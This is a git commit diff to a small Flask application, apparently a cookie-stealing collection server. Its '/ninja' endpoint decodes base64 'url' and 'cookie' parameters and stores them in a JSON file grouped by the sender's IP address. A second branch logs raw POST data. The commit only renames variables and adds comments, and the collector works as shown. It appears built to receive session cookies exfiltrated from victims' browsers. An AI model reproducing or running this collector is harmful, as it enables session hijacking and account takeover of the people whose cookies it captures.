0b8be116dfb84287b414ee3334aac5f2ff417f75
ghirla_m <mathieu.ghirlanda@epita.fr>
2018-08-19 14:04:50 +0200

    [MISC] Remove useless code and add comments

--- app.py
+++ app.py
@@ -10,40 +10,52 @@ app = Flask(__name__)
 
 @app.route('/')
 def hello_world():
+    '''
+    That's only for checking out if the server's running
+    '''
     return 'Hello World!'
 
 
 @app.route('/ninja', methods=['POST', 'GET'])
 def ninja():
-    error = None
+    '''
+    Function who gets the arguments from http requests 
+    '''
+    
+    # Case of GET methods
     if request.method == 'GET':
-        f = base64.b64decode(request.args.get('url')).decode('ascii')
-        c = base64.b64decode(request.args.get('cookie')).decode('ascii')
 
-        print(f, file=sys.stdout)
-        print(c, file=sys.stdout)
+        # Get the data from the http request
+        url = base64.b64decode(request.args.get('url')).decode('ascii')
+        cookies = base64.b64decode(request.args.get('cookie')).decode('ascii')
 
+        # Here we'll store as a JSon object the data we will get
         data = {}
         with open('/home/ultrae/FLASK_TEST/here.json', "r") as file:
+            # Check if the file is empty
             if os.stat('/home/ultrae/FLASK_TEST/here.json').st_size != 0:
                 data = json.load(file)
 
         with open('/home/ultrae/FLASK_TEST/here.json', "w") as file:
+            # We want to stock data by IP addresses
+
             if not request.remote_addr in data:
                 data[request.remote_addr] = [
-                    {"url": f, "cookies": c.strip(";")}]
+                    {"url": url, "cookies": cookies.strip(";")}]
             else:
                 data[request.remote_addr].append(
-                    {"url": f, "cookies": c.strip(";")})
+                    {"url": url, "cookies": cookies.strip(";")})
             json.dump(data, file)
 
         return 'GET'
 
+    # Case of POST methods
+    # Not working yet !
     if request.method == 'POST':
-        f = request.data
-        f = f.decode('ascii')
+        url = request.data
+        url = url.decode('ascii')
         with open('/home/ultrae/FLASK_TEST/here', "a") as file:
-            file.write(f + " " + request.remote_addr + '\n')
+            file.write(url + " " + request.remote_addr + '\n')
         return 'POST'
 
     return 'error'
